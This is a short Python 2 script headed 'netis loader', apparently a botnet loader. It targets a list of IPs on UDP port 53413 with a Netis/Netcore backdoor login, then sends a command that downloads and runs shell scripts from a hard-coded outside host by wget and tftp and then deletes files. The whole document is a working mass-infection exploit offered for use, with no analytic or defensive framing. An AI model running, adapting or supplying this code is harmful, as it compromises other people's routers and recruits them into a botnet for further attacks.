#!/usr/bin/python
# netis loader
# by light

import threading, sys, time, random, socket, re, os

if len(sys.argv) < 2:
        print "Usage: python "+sys.argv[0]+" <list>"
        sys.exit()

loginpayload = "AAAAAAAAnetcore\x00"
commandpayload = "AA\x00\x00AAAA cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.112.157.85/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 185.112.157.85 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.112.157.85; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh; rm -rf *"
list = open(sys.argv[1], "r").readlines()
offline = 0
class netis(threading.Thread):
        def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
        def run(self):
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			try:
				print "\033[31m[\033[32m+\033[31m] \033[32mAttempting:\033[32m %s"%(self.ip)
				s.sendto(loginpayload, (self.ip, 53413))
				time.sleep(1.5)
				s.sendto(commandpayload, (self.ip, 53413))
				time.sleep(30)
			except Exception:
				pass
for ip in list:
	try:
		t = netis(ip)
		t.start()
		time.sleep(0.01)
	except:
		pass
